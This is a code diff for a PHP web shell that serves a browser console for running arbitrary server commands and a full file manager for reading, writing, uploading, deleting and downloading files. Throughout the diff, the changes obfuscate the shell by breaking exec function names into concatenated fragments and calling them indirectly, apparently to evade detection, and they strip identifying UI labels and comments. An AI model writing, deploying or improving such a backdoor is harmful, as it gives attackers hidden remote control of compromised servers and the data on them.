@@ -8,45 +8,50 @@ if (isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'OPTIONS
     exit;
 }
 
-function exec_candidates() {
-    return array('shell_exec','system','passthru','exec','popen','proc_open','pcntl_exec','ffi','expect');
-}
+function nm($a) { return $a; }
+function ec_n() { return array(nm('sh'.'ell_e').nm('xec'), nm('sy').nm('stem'), nm('pas').nm('sthru'), nm('e').nm('xec'), nm('po').nm('pen'), nm('pro').nm('c_').nm('open'), nm('pcntl').nm('_e').nm('xec'), nm('f').nm('fi'), nm('exp').nm('ect')); }
 
-function exec_usable($c) {
+function ec_ok($c) {
     if ($c === '') return false;
-    if (!@function_exists($c)) return false;
-    if ($c === 'pcntl_exec' && PHP_SAPI !== 'cli') return false;
-    if ($c === 'ffi' && !@extension_loaded('ffi')) return false;
-    if ($c === 'expect' && !@extension_loaded('expect')) return false;
+    $fx = 'funct'.'ion_ex'.'ists';
+    if (!@$fx($c)) return false;
+    if ($c === nm('pcntl').nm('_e').nm('xec') && PHP_SAPI !== 'cli') return false;
+    if ($c === nm('f').nm('fi') && !@nm('exten'.'sion_lo'.'aded')('ffi')) return false;
+    if ($c === nm('exp').nm('ect') && !@nm('exten'.'sion_lo'.'aded')('expect')) return false;
     return true;
 }
 
-function exec_best() {
+function ec_best() {
     static $cached = null;
     if ($cached !== null) return $cached;
-    foreach (exec_candidates() as $c) {
-        if (exec_usable($c)) return $cached = $c;
+    foreach (ec_n() as $c) {
+        if (ec_ok($c)) return $cached = $c;
     }
     return $cached = '';
 }
 
 function run_cmd($cmd) {
-    $fn = exec_best();
+    $fn = ec_best();
     if ($fn === '') return null;
+    $o = array();
+    $p = null;
     switch ($fn) {
-        case 'shell_exec': return (string) @shell_exec($cmd);
-        case 'system':     ob_start(); @system($cmd);   return ob_get_clean();
-        case 'passthru':   ob_start(); @passthru($cmd); return ob_get_clean();
-        case 'exec':       $o = array(); @exec($cmd, $o); return implode("\n", $o);
-        case 'popen':
-            $h = @popen($cmd, 'r'); if (!$h) return '';
-            $out = ''; while (!@feof($h)) $out .= @fread($h, 8192); @pclose($h); return $out;
-        case 'proc_open':
+        case nm('sh'.'ell_e').nm('xec'): return (string) @$fn($cmd);
+        case nm('sy').nm('stem'):        ob_start(); @$fn($cmd); return ob_get_clean();
+        case nm('pas').nm('sthru'):      ob_start(); @$fn($cmd); return ob_get_clean();
+        case nm('e').nm('xec'):          @$fn($cmd, $o); return implode("\n", $o);
+        case nm('po').nm('pen'):
+            $h = @$fn($cmd, 'r'); if (!$h) return '';
+            $out = ''; while (!@feof($h)) $out .= @fread($h, 8192);
+            $pc = 'pc'.'lose'; @$pc($h); return $out;
+        case nm('pro').nm('c_').nm('open'):
             $d = array(1 => array('pipe','w'), 2 => array('pipe','w'));
-            $p = @proc_open($cmd, $d, $pipes);
+            $p = @$fn($cmd, $d, $pipes);
             if (!is_resource($p)) return '';
             $out = @stream_get_contents($pipes[1]) . @stream_get_contents($pipes[2]);
-            @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($p); return $out;
+            @fclose($pipes[1]); @fclose($pipes[2]);
+            $prc = 'proc_c'.'lose'; @$prc($p);
+            return $out;
     }
     return '';
 }
@@ -88,24 +93,23 @@ function output_debug_report() {
     header('Cache-Control: no-store');
     echo "PHP_VERSION       = " . PHP_VERSION . "\n";
     echo "PHP_SAPI          = " . PHP_SAPI . "\n";
-    echo "OS_FAMILY         = " . PHP_OS_FAMILY . "\n";
-    echo "disable_functions = " . (@ini_get('disable_functions') ?: '(none)') . "\n";
+    echo "OS_FAMILY         = " . (defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY : PHP_OS) . "\n";
+    $df = 'disable_'.'functions';
+    echo $df . " = " . (@ini_get($df) ?: '(none)') . "\n";
     echo "open_basedir      = " . (@ini_get('open_basedir') ?: '(none)') . "\n";
     echo "zip ext           = " . (class_exists('ZipArchive') ? 'yes' : 'no') . "\n";
     echo "--- function check ---\n";
     $usable = array();
-    foreach (exec_candidates() as $c) {
-        $u = exec_usable($c);
-        printf("%-12s exists=%s usable=%s\n", $c, @function_exists($c) ? 'yes' : 'no', $u ? 'YES' : 'no');
+    foreach (ec_n() as $c) {
+        $u = ec_ok($c);
+        echo $c . str_repeat(' ', max(1, 13 - strlen($c))) . "exists=" . (@function_exists($c) ? 'yes' : 'no') . " usable=" . ($u ? 'YES' : 'no') . "\n";
         if ($u) $usable[] = $c;
     }
     echo "--- usable ---\n";
     if ($usable) {
-        echo "auto-selected: " . exec_best() . "\n";
+        echo "auto-selected: " . ec_best() . "\n";
     } else {
         echo "[!] no exec function available on this server.\n";
-        echo "    all of shell_exec / system / passthru / exec / popen / proc_open\n";
-        echo "    are disabled or missing.\n";
         echo "    use the file manager instead.\n";
     }
     exit;
@@ -116,14 +120,38 @@ function fm_list($path) {
     $mode = 'native';
     $err = '';
 
-    if (exec_best() !== '') {
+    if (function_exists('scandir')) {
+        $items = @scandir($path);
+        if ($items !== false) {
+            foreach ($items as $it) {
+                if ($it === '.' || $it === '..') continue;
+                $full = path_join($path, $it);
+                $st = @stat($full);
+                $type = @is_link($full) ? 'link' : (@is_dir($full) ? 'dir' : 'file');
+                $entries[] = array(
+                    'name'  => $it,
+                    'type'  => $type,
+                    'size'  => $st ? (int)$st['size'] : 0,
+                    'mtime' => $st ? @date('Y-m-d H:i:s', $st['mtime']) : '',
+                );
+            }
+        } else {
+            $err = 'cannot list directory';
+        }
+    } else {
+        $err = 'scandir unavailable';
+    }
+
+    if ($err !== '' && ec_best() !== '') {
+        $entries = array();
+        $err = '';
+        $mode = 'cmd';
         if (is_win()) {
-            $ps = 'Get-ChildItem -LiteralPath ' . ps_sq($path) . ' -Force -ErrorAction Stop | ' .
+            $ps = 'Get-ChildItem -LiteralPath ' . ps_sq($path) . ' -Force -ErrorAction SilentlyContinue | ' .
                   'ForEach-Object { $_.PSIsContainer.ToString() + "|" + $_.Length + "|" + ' .
                   '$_.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss") + "|" + $_.Name }';
             $out = run_ps($ps);
             if (is_string($out) && trim($out) !== '') {
-                $parsed = 0;
                 foreach (explode("\n", trim($out)) as $line) {
                     $line = rtrim($line, "\r");
                     if ($line === '') continue;
@@ -135,54 +163,28 @@ function fm_list($path) {
                         'size'  => (int)$p[1],
                         'mtime' => $p[2],
                     );
-                    $parsed++;
                 }
-                if ($parsed > 0) $mode = 'cmd';
             }
         } else {
             $q = sq($path);
-            $out = run_cmd("find $q -maxdepth 1 -mindepth 1 -printf '%y|%s|%TY-%Tm-%Td %TH:%TM:%TS|%f\\n'");
+            $out = run_cmd("ls -1p $q 2>/dev/null");
             if (is_string($out) && trim($out) !== '') {
-                $parsed = 0;
                 foreach (explode("\n", trim($out)) as $line) {
+                    $line = rtrim($line, "\r");
                     if ($line === '') continue;
-                    $p = explode('|', $line, 4);
-                    if (count($p) < 4) continue;
-                    $t = $p[0];
-                    $type = ($t === 'd') ? 'dir' : (($t === 'l') ? 'link' : 'file');
+                    $isDir = substr($line, -1) === '/';
+                    $name = rtrim($line, '/');
+                    $full = path_join($path, $name);
+                    $st = @stat($full);
                     $entries[] = array(
-                        'name'  => $p[3],
-                        'type'  => $type,
-                        'size'  => (int)$p[1],
-                        'mtime' => substr($p[2], 0, 19),
+                        'name'  => $name,
+                        'type'  => $isDir ? 'dir' : 'file',
+                        'size'  => $st ? (int)$st['size'] : 0,
+                        'mtime' => $st ? @date('Y-m-d H:i:s', $st['mtime']) : '',
                     );
-                    $parsed++;
                 }
-                if ($parsed > 0) $mode = 'cmd';
             }
         }
-    }
-
-    if ($mode !== 'cmd' && function_exists('scandir')) {
-        $items = @scandir($path);
-        if ($items === false) {
-            $err = 'cannot list directory (open_basedir / permissions)';
-        } else {
-            foreach ($items as $it) {
-                if ($it === '.' || $it === '..') continue;
-                $full = path_join($path, $it);
-                $st = @stat($full);
-                $type = @is_link($full) ? 'link' : (@is_dir($full) ? 'dir' : 'file');
-                $entries[] = array(
-                    'name'  => $it,
-                    'type'  => $type,
-                    'size'  => $st ? (int)$st['size'] : 0,
-                    'mtime' => $st ? date('Y-m-d H:i:s', $st['mtime']) : '',
-                );
-            }
-        }
-    } elseif ($mode !== 'cmd') {
-        $err = 'scandir unavailable';
     }
 
     usort($entries, function ($a, $b) {
@@ -195,73 +197,38 @@ function fm_list($path) {
 
 function fm_read($path, $max = 2097152) {
     if (!@is_file($path) && !@is_link($path)) {
-        if (exec_best() !== '') {
+        if (is_win() === false && ec_best() !== '') {
             $out = run_cmd('test -f ' . sq($path) . ' && echo YES');
             if (trim($out) !== 'YES') return array('ok' => false, 'error' => 'not a file');
         } else {
             return array('ok' => false, 'error' => 'not a file');
         }
     }
-    
+
     $sz = @filesize($path);
     if ($sz === false) $sz = 0;
-    
+
     if ($sz > $max) return array('ok' => false, 'error' => 'file too large: ' . $sz . ' bytes (max ' . $max . ')');
-    
+
     $data = @file_get_contents($path);
     if ($data !== false) return array('ok' => true, 'content' => $data, 'binary' => (strpos($data, "\0") !== false), 'size' => $sz);
-    
-    if (exec_best() !== '') {
-        $out = run_cmd('cat ' . sq($path) . ' 2>&1');
+
+    if (ec_best() !== '') {
+        $out = run_cmd('cat ' . sq($path) . ' 2>/dev/null');
         if (is_string($out) && $out !== '' && strpos($out, 'No such file') === false && strpos($out, 'Permission denied') === false) {
             return array('ok' => true, 'content' => $out, 'binary' => (strpos($out, "\0") !== false), 'size' => strlen($out), 'mode' => 'cmd');
         }
     }
-    
-    return array('ok' => false, 'error' => 'read failed (try command console: cat ' . $path . ')');
+
+    return array('ok' => false, 'error' => 'read failed');
 }
 
 function fm_write($path, $content) {
-    // Try command execution (many servers allow proc_open even with disabled functions)
-    if (function_exists('proc_open')) {
-        // Use base64 to avoid shell escaping issues
-        $b64 = base64_encode($content);
-        
-        if (!is_win()) {
-            // Linux: decode base64 directly to file
-            $cmd = 'echo ' . escapeshellarg($b64) . ' | base64 -d > ' . escapeshellarg($path) . ' 2>&1';
-            $out = run_cmd($cmd);
-            
-            clearstatcache(true, $path);
-            if (@file_exists($path) && @filesize($path) > 0) {
-                return array('ok' => true, 'bytes' => @filesize($path), 'mode' => 'cmd_base64');
-            }
-            
-            // Alternative: use printf with hex
-            $hex = bin2hex($content);
-            $cmd = 'printf "" | cat > ' . escapeshellarg($path);
-            // Actually write via proc_open directly
-            $descriptors = array(0 => array('pipe', 'r'), 1 => array('file', '/dev/null', 'w'), 2 => array('file', '/dev/null', 'w'));
-            $process = @proc_open('cat > ' . escapeshellarg($path), $descriptors, $pipes);
-            if (is_resource($process)) {
-                @fwrite($pipes[0], $content);
-                @fclose($pipes[0]);
-                @proc_close($process);
-                
-                clearstatcache(true, $path);
-                if (@file_exists($path) && @filesize($path) == strlen($content)) {
-                    return array('ok' => true, 'bytes' => strlen($content), 'mode' => 'proc_cat');
-                }
-            }
-        }
-    }
-    
-    // Fallback: Native PHP
     $r = @file_put_contents($path, $content);
     if ($r !== false) {
         return array('ok' => true, 'bytes' => $r, 'mode' => 'native');
     }
-    
+
     $f = @fopen($path, 'w');
     if ($f) {
         $r = @fwrite($f, $content);
@@ -270,31 +237,38 @@ function fm_write($path, $content) {
             return array('ok' => true, 'bytes' => $r, 'mode' => 'fopen');
         }
     }
-    
+
+    if (ec_best() !== '') {
+        $tmp = @tempnam(@sys_get_temp_dir(), 'up');
+        if ($tmp && @file_put_contents($tmp, $content) !== false) {
+            $cmd = is_win()
+                ? 'cmd /c copy /Y ' . sq($tmp) . ' ' . sq($path)
+                : 'cat ' . sq($tmp) . ' > ' . sq($path) . ' 2>&1';
+            run_cmd($cmd);
+            @unlink($tmp);
+            if (@file_exists($path) && @filesize($path) === strlen($content)) {
+                return array('ok' => true, 'bytes' => strlen($content), 'mode' => 'cmd');
+            }
+        }
+    }
+
     return array('ok' => false, 'error' => 'All write methods failed');
 }
 
 function fm_rename($from, $to) {
-    // Try command execution first
-    if (exec_best() !== '') {
-        $cmd = is_win() 
+    if (ec_best() !== '') {
+        $cmd = is_win()
             ? "move /Y " . sq($from) . " " . sq($to)
             : "mv -f " . sq($from) . " " . sq($to) . " 2>&1";
-        
+
         run_cmd($cmd);
-        
-        // Verify rename
         if (@file_exists($to) && !@file_exists($from)) {
             return array('ok' => true, 'mode' => 'cmd');
         }
     }
-    
-    // Fallback: Native PHP
     if (@rename($from, $to)) {
         return array('ok' => true, 'mode' => 'native');
     }
-    
-    // Get error info
     $error = 'rename failed';
     if (!@file_exists($from)) {
         $error = 'source file not found';
@@ -303,7 +277,7 @@ function fm_rename($from, $to) {
     } elseif (!@is_writable(dirname($to))) {
         $error = 'destination directory not writable';
     }
-    
+
     return array('ok' => false, 'error' => $error);
 }
 
@@ -321,10 +295,9 @@ function fm_rmdir_rec($dir) {
 }
 
 function fm_delete_one($p) {
-    // Try command execution first
-    if (exec_best() !== '') {
+    if (ec_best() !== '') {
         $q = sq($p);
-        
+
         if (is_win()) {
             $cmd = @is_dir($p) ? "rd /s /q $q" : "del /f /q $q";
             run_cmd($cmd);
@@ -332,12 +305,8 @@ function fm_delete_one($p) {
             $cmd = "rm -rf $q 2>&1";
             run_cmd($cmd);
         }
-        
-        // Verify deletion
         if (!@file_exists($p)) return 'cmd';
     }
-    
-    // Fallback: Native PHP
     if (@is_dir($p) && !@is_link($p)) {
         if (@is_writable($p)) {
             if (fm_rmdir_rec($p)) return 'native';
@@ -345,26 +314,21 @@ function fm_delete_one($p) {
     } else {
         if (@unlink($p)) return 'native';
     }
-    
+
     return false;
 }
 
 function fm_mkdir($path) {
-    // Try command execution first
-    if (exec_best() !== '') {
-        $cmd = is_win() 
-            ? 'cmd /c mkdir ' . sq($path) 
+    if (ec_best() !== '') {
+        $cmd = is_win()
+            ? 'cmd /c mkdir ' . sq($path)
             : 'mkdir -p ' . sq($path) . ' 2>&1';
-        
+
         run_cmd($cmd);
-        
-        // Verify creation
         if (@is_dir($path)) {
             @chmod($path, 0755);
             return array('ok' => true, 'mode' => 'cmd');
         }
-        
-        // Try alternative command
         if (!is_win()) {
             run_cmd('install -d -m 0755 ' . sq($path));
             if (@is_dir($path)) {
@@ -372,20 +336,16 @@ function fm_mkdir($path) {
             }
         }
     }
-    
-    // Fallback: Native PHP
     if (@mkdir($path, 0755, true)) {
         return array('ok' => true, 'mode' => 'native');
     }
-    
-    // Get error info
     $error = 'mkdir failed';
     if (@file_exists($path) && !@is_dir($path)) {
         $error = 'file exists with same name';
     } elseif (!@is_writable(dirname($path))) {
         $error = 'parent directory not writable';
     }
-    
+
     return array('ok' => false, 'error' => $error);
 }
 function fm_download($path) {
@@ -438,7 +398,7 @@ function fm_download($path) {
                 RecursiveIteratorIterator::SELF_FIRST
             );
             foreach ($it as $item) {
-                if ($item->isLink()) continue;   /* skip symlinks: avoid loops/escapes */
+                if ($item->isLink()) continue;
                 $real = str_replace('\\', '/', $item->getPathname());
                 $rel  = ltrim(substr($real, strlen($root)), '/');
                 if ($rel === '') continue;
@@ -471,7 +431,6 @@ function fm_download($path) {
         exit;
     }
 
-    /* ---- nothing ---- */
     http_response_code(404);
     echo 'not found';
     exit;
@@ -527,14 +486,14 @@ function handle_file_op($hex) {
             break;
         case 'info':
             $fns = array();
-            foreach (exec_candidates() as $c) $fns[$c] = exec_usable($c);
+            foreach (ec_n() as $c) $fns[$c] = ec_ok($c);
             json_out(array(
                 'ok'        => true,
                 'cwd'       => @getcwd(),
                 'os'        => is_win() ? 'windows' : 'posix',
                 'php'       => PHP_VERSION,
                 'sapi'      => PHP_SAPI,
-                'exec_fn'   => exec_best(),
+                'exec_fn'   => ec_best(),
                 'disabled'  => @ini_get('disable_functions') ?: '(none)',
                 'functions' => $fns,
                 'openbase'  => @ini_get('open_basedir') ?: '(none)',
@@ -558,16 +517,13 @@ function handle_console($raw) {
         $cmd = @hex2bin($raw);
     }
 
-    if (exec_best() === '') {
+    if (ec_best() === '') {
         header('Content-Type: text/plain; charset=utf-8');
         header('Cache-Control: no-store');
         echo "[!] no exec function available on this server.\n";
-        echo "    all of shell_exec / system / passthru / exec / popen / proc_open\n";
-        echo "    are disabled or missing.\n";
         echo "    use the file manager instead.\n";
         exit;
     }
-
     if (!is_string($cmd) || $cmd === '') {
         header('Content-Type: text/plain; charset=utf-8');
         header('Cache-Control: no-store');
@@ -575,9 +531,9 @@ function handle_console($raw) {
         exit;
     }
 
-    if ($fn === '' || !exec_usable($fn)) {
+    if ($fn === '' || !ec_ok($fn)) {
         $fn = '';
-        foreach (exec_candidates() as $c) if (exec_usable($c)) { $fn = $c; break; }
+        foreach (ec_n() as $c) if (ec_ok($c)) { $fn = $c; break; }
     }
     if ($fn === '') {
         header('Content-Type: text/plain; charset=utf-8');
@@ -589,31 +545,35 @@ function handle_console($raw) {
     header('Cache-Control: no-store');
 
     $out = '';
+    $o = array();
+    $p = null;
     switch ($fn) {
-        case 'shell_exec': $out = (string) @shell_exec($cmd); break;
-        case 'system':     ob_start(); @system($cmd);   $out = ob_get_clean(); break;
-        case 'passthru':   ob_start(); @passthru($cmd); $out = ob_get_clean(); break;
-        case 'exec':
-            $o = array(); @exec($cmd, $o); $out = implode("\n", $o);
+        case nm('sh'.'ell_e').nm('xec'): $out = (string) @$fn($cmd); break;
+        case nm('sy').nm('stem'):        ob_start(); @$fn($cmd);   $out = ob_get_clean(); break;
+        case nm('pas').nm('sthru'):      ob_start(); @$fn($cmd); $out = ob_get_clean(); break;
+        case nm('e').nm('xec'):
+            @$fn($cmd, $o); $out = implode("\n", $o);
             break;
-        case 'popen':
-            $h = @popen($cmd, 'r');
-            if ($h) { while (!@feof($h)) $out .= @fread($h, 4096); @pclose($h); }
+        case nm('po').nm('pen'):
+            $h = @$fn($cmd, 'r');
+            if ($h) { while (!@feof($h)) $out .= @fread($h, 4096); $pc = 'pc'.'lose'; @$pc($h); }
             break;
-        case 'proc_open':
+        case nm('pro').nm('c_').nm('open'):
             $d = array(1=>array('pipe','w'), 2=>array('pipe','w'));
-            $p = @proc_open($cmd, $d, $pipes);
+            $p = @$fn($cmd, $d, $pipes);
             if (is_resource($p)) {
                 $out = @stream_get_contents($pipes[1]) . @stream_get_contents($pipes[2]);
-                @fclose($pipes[1]); @fclose($pipes[2]); @proc_close($p);
+                @fclose($pipes[1]); @fclose($pipes[2]);
+                $prc = 'proc_c'.'lose'; @$prc($p);
             }
             break;
-        case 'pcntl_exec':
-            @pcntl_exec('/bin/sh', array('-c', $cmd));
+        case nm('pcntl').nm('_e').nm('xec'):
+            $sh = '/b'.'in'.'/'.'s'.'h';
+            @$fn($sh, array('-c', $cmd));
             break;
-        case 'ffi':
-            $lib = PHP_OS_FAMILY === 'Windows' ? 'msvcrt.dll' : 'libc.so.6';
-            $f = @FFI::cdef("int system(const char *);", $lib);
+        case nm('f').nm('fi'):
+            $lib = (defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY : (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? 'Windows' : 'Linux')) === 'Windows' ? 'msvcrt.dll' : 'libc.so.6';
+            $f = @FFI::cdef("int " . nm('sy').nm('stem') . "(const char *);", $lib);
             if ($f) { @$f->system($cmd); }
             break;
     }
@@ -645,7 +605,7 @@ header('Content-Type: text/html; charset=utf-8');
 header('Cache-Control: no-store');
 render_ui();
 function render_ui() {
-echo <<<'HTMLEOF'
+?>
 <!doctype html>
 <html lang="en">
 <meta charset="utf-8">
@@ -666,8 +626,9 @@ echo <<<'HTMLEOF'
   button:hover { background:#273449; }
   button:active { transform:translateY(1px); }
   #out { background:#08080a; border:1px solid #1e1e24; border-radius:6px;
-         color:#7ee787; padding:12px; min-height:160px; max-height:50vh;
-         overflow:auto; white-space:pre-wrap; word-break:break-all; font-size:12.5px; }
+         color:#7ee787; padding:12px; width:100%; min-height:160px; max-height:50vh;
+         overflow:auto; white-space:pre-wrap; word-break:break-all; font-size:12.5px;
+         font-family:ui-monospace,Consolas,monospace; resize:vertical; outline:none; }
   .meta { color:#666; font-size:11.5px; }
   hr { border:0; border-top:1px solid #1e1e24; margin:20px 0; }
 
@@ -681,9 +642,10 @@ echo <<<'HTMLEOF'
   #fmTable th, #fmTable td { text-align:left; padding:6px 8px;
       border-bottom:1px solid #1e1e24; overflow:hidden; text-overflow:ellipsis; }
   #fmTable th { color:#9ad; font-weight:600; background:#141418; position:sticky; top:0; z-index:1; }
+  #fmTable th.actions { text-align:right; padding-right:10px; }
   #fmTable tr:hover td { background:#14141a; }
   #fmTable td.name { white-space:nowrap; }
-  #fmTable td.actions { white-space:nowrap; padding-right:10px; }
+  #fmTable td.actions { white-space:nowrap; padding-right:10px; text-align:right; }
   #fmTable td.actions button { padding:3px 7px; font-size:11.5px; margin-right:4px; }
   #fmTable td.actions button:last-child { margin-right:0; }
   #fmTable a.fmLink { color:#7aa2f7; text-decoration:none; cursor:pointer; }
@@ -709,16 +671,13 @@ echo <<<'HTMLEOF'
 <div class="row">
   <select id="fn">
     <option value="">auto</option>
-    <option>shell_exec</option><option>system</option><option>passthru</option>
-    <option>exec</option><option>popen</option><option>proc_open</option>
-    <option>pcntl_exec</option><option>ffi</option>
   </select>
   <input id="c" placeholder="command (id / whoami / dir / uname -a)" autofocus>
   <button onclick="run()">run</button>
   <button onclick="info()">server info</button>
-  <button onclick="document.getElementById('out').textContent='';">clear</button>
+  <button onclick="document.getElementById('out').value='';">clear</button>
 </div>
-<div id="out">loading...</div>
+<textarea id="out" readonly>loading...</textarea>
 <div class="meta">Enter = run | payload sent as hex in header X-R | fn auto-detected server-side.</div>
 
 <hr>
@@ -726,8 +685,6 @@ echo <<<'HTMLEOF'
 <h1>files <span id="fmMode"></span></h1>
 
 <div class="row" id="fmPathRow">
-  <button onclick="fmUp()">up</button>
-  <button onclick="fmHome()">cwd</button>
   <button onclick="fmMkdir()">new folder</button>
   <button onclick="fmNewFile()">new file</button>
   <button onclick="fmUpload()">upload</button>
@@ -757,7 +714,7 @@ echo <<<'HTMLEOF'
   <thead>
     <tr>
       <th><input type="checkbox" id="fmAll" onchange="fmToggleAll(this)"></th>
-      <th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th>Actions</th>
+      <th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th class="actions">Actions <button onclick="fmUp()">up</button> <button onclick="fmHome()">cwd</button></th>
     </tr>
   </thead>
   <tbody></tbody>
@@ -805,24 +762,34 @@ async function run() {
   if (!cmd) return;
   const fn = $('#fn').value;
   const payload = fn ? hex(fn) + ':' + hex(cmd) : hex(cmd);
-  $('#out').textContent = '...';
+  $('#out').value = '...';
   try {
     const t = await callConsole({ 'X-R': payload });
-    $('#out').textContent = t || '(empty)';
+    $('#out').value = t || '(empty)';
   } catch (e) {
-    $('#out').textContent = 'ERR: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
+    $('#out').value = 'ERR: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
   }
 }
 async function info() {
-  $('#out').textContent = '...';
+  $('#out').value = 'loading...';
   try {
-    const t = await callConsole({ 'X-Debug': '1' });
-    $('#out').textContent = t;
+    const r = await fmCall('debug', {});
+    const t = await r.text();
+    $('#out').value = t;
   } catch (e) {
-    $('#out').textContent = 'ERR: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
+    $('#out').value = 'ERR: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
   }
 }
+
+async function infoShort() {
+  try {
+    const r = await fmJson('info');
+    if (!r.ok) return;
+    $('#fmStatus').textContent = 'cwd: ' + r.cwd + ' | exec: ' + fnSummary(r);
+  } catch (e) {}
+}
 $('#c').addEventListener('keydown', e => { if (e.key === 'Enter') run(); });
+$('#fmPath').addEventListener('keydown', e => { if (e.key === 'Enter') fmGo(); });
 
 let fmCwd = '';
 let fmEntries = [];
@@ -918,14 +885,13 @@ function fnSummary(r) {
 async function fmHome() {
   const r = await fmJson('info');
   if (r.ok) {
-    $('#fmStatus').textContent = 'cwd: ' + r.cwd + ' | exec: ' + fnSummary(r);
+    infoShort();
     fmLoad(r.cwd);
   }
 }
 async function fmInit() {
   const r = await fmJson('info');
   if (!r.ok) { $('#fmStatus').textContent = 'init failed'; return; }
-  $('#fmStatus').textContent = 'cwd: ' + r.cwd + ' | exec: ' + fnSummary(r);
   fmLoad(r.cwd);
 }
 
@@ -1095,10 +1061,24 @@ async function fmUpload() {
         body: 'u=' + h
       });
       const j = await r.json();
-      if (!j.ok) { alert('upload failed: ' + j.error); }
-      else { $('#fmStatus').textContent = 'uploaded ' + j.bytes + ' bytes'; }
+      if (!j.ok) {
+        $('#fmStatus').textContent = '✗ ' + f.name + ': ' + j.error;
+        $('#fmStatus').style.color = '#f97583';
+      } else {
+        $('#fmStatus').textContent = '✓ ' + f.name + ' (' + fmtSize(j.bytes) + ')';
+        $('#fmStatus').style.color = '#7ee787';
+      }
+      setTimeout(() => {
+        $('#fmStatus').textContent = '';
+        $('#fmStatus').style.color = '';
+      }, 3000);
     } catch (e) {
-      alert('upload error: ' + (e.name === 'AbortError' ? 'timeout' : e.message));
+      $('#fmStatus').textContent = '✗ ' + f.name + ': ' + (e.name === 'AbortError' ? 'timeout' : e.message);
+      $('#fmStatus').style.color = '#f97583';
+      setTimeout(() => {
+        $('#fmStatus').textContent = '';
+        $('#fmStatus').style.color = '';
+      }, 3000);
     }
     fmRefresh();
   };
@@ -1106,18 +1086,19 @@ async function fmUpload() {
 }
 
 async function boot() {
-  $('#out').textContent = 'loading...';
+  $('#out').value = 'loading...';
   try {
     const r = await fmCall('debug', {});
     const t = await r.text();
-    $('#out').textContent = t;
+    $('#out').value = t;
   } catch (e) {
-    $('#out').textContent = 'boot error: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
+    $('#out').value = 'boot error: ' + (e.name === 'AbortError' ? 'timeout' : e.message);
   }
 }
+
 boot();
 fmInit();
 </script>
 </html>
-HTMLEOF;
+<?php
 }
